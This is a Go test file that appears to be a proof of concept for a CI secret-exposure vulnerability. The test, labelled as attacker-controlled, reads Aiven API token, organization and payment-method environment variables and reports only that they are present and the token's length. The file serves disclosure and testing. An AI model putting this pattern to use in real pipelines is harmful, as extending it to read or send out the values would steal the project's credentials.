package poc_test

import (
    "fmt"
    "os"
    "testing"
)

func TestAccPoCSecretDetection(t *testing.T) {
    token := os.Getenv("AIVEN_TOKEN")
    org := os.Getenv("AIVEN_ORGANIZATION_NAME")
    payment := os.Getenv("AIVEN_PAYMENT_METHOD_ID")

    fmt.Println("=== POC: Attacker-controlled code executing ===")
    fmt.Printf("AIVEN_TOKEN present: %v (length: %d)\n", token != "", len(token))
    fmt.Printf("AIVEN_ORGANIZATION_NAME present: %v\n", org != "")
    fmt.Printf("AIVEN_PAYMENT_METHOD_ID present: %v\n", payment != "")
    fmt.Println("=== END POC ===")

    if token == "" {
        t.Fatal("AIVEN_TOKEN was not available - secrets not inherited")
    }

    t.Log("SUCCESS: Attacker-controlled test executed with access to secrets")
}
